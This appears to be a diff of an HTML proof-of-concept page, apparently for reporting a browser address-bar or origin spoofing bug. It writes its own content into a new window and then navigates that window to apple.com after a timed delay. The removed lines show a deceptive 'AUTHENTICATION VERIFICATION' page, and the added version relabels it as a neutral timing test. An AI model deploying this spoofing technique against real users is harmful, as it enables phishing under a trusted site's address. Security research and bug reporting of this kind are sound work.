@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>Streamlined Origin Spoofing PoC</title>
+    <title>Transition Timing & State PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -41,12 +41,12 @@
   </head>
   <body>
     <div class="container">
-      <button id="execBtn">INITIALIZE STREAMLINED EXPLOIT</button>
+      <button id="execBtn">INITIALIZE TRANSITION TEST</button>
       <div class="info" id="statusInfo">Status: Ready for execution.</div>
     </div>
 
     <script>
-      // Menggunakan let sesuai preferensi perbaikan deklarasi variabel
+      // Menggunakan let sesuai struktur yang diinginkan (tanpa const)
       let execButton = document.getElementById("execBtn");
       let statusInfo = document.getElementById("statusInfo");
 
@@ -54,7 +54,7 @@
         statusInfo.innerText = "Status: Initializing execution flow...";
         this.style.display = "none";
 
-        // Membuka jendela baru dengan referensi let (menghindari const)
+        // Membuka jendela baru menggunakan let targetWindow
         let targetWindow = window.open("about:blank", "_blank");
 
         if (!targetWindow) {
@@ -63,9 +63,10 @@
         }
 
         try {
-          statusInfo.innerText = "Status: Writing initial deceptive DOM structure...";
+          statusInfo.innerText = "Status: Injecting custom state payload...";
 
-          let htmlPayload = `
+          // Payload awal untuk menguji jeda render visual
+          let initialPayload = `
             <!DOCTYPE html>
             <html>
             <head>
@@ -78,38 +79,40 @@
                   height: 100vh; text-align: center;
                 }
                 .box { padding: 40px; }
-                h1 { font-size: 38px; color: #d70015; margin-bottom: 10px; font-weight: 700; }
-                p { font-size: 20px; color: #0066cc; font-weight: 500; }
+                h1 { font-size: 42px; color: #d70015; margin-bottom: 10px; font-weight: 700; }
+                p { font-size: 24px; color: #0066cc; font-weight: 500; }
               </style>
             </head>
             <body>
               <div class="box">
-                <h1>AUTHENTICATION VERIFICATION</h1>
-                <p>Establishing secure connection state...</p>
+                <h1>NOT APPLE</h1>
+                <p>Simulated State Transition</p>
               </div>
             </body>
             </html>
           `;
 
-          // Eksekusi penulisan dokumen secara sinkron ke jendela target
           targetWindow.document.open();
-          targetWindow.document.write(htmlPayload);
+          targetWindow.document.write(initialPayload);
           targetWindow.document.close();
 
-          statusInfo.innerText = "Status: DOM committed. Synchronizing timing sequence...";
+          statusInfo.innerText = "Status: Payload committed. Managing navigation timing sequence...";
 
-          // Logika timing terstruktur untuk menguji stabilitas transisi state
+          // Logika Timing diperkuat untuk menguji ketahanan transisi ke target eksternal
           setTimeout(() => {
             try {
-              statusInfo.innerText = "Status: Dispatching final target navigation...";
+              statusInfo.innerText = "Status: Triggering transition toward target URL...";
+              
+              // Mengarahkan ke target eksternal untuk menguji perilaku commit bilah alamat
               targetWindow.location.href = "https://apple.com";
+
             } catch (navError) {
-              statusInfo.innerText = "Status: Navigation restricted by security policy: " + navError.message;
+              statusInfo.innerText = "Status: Transition restricted by security policy: " + navError.message;
             }
-          }, 800);
+          }, 1000);
 
         } catch (err) {
-          statusInfo.innerText = "Status: Injection error encountered: " + err.message;
+          statusInfo.innerText = "Status: Execution error encountered: " + err.message;
         }
       };
     </script>
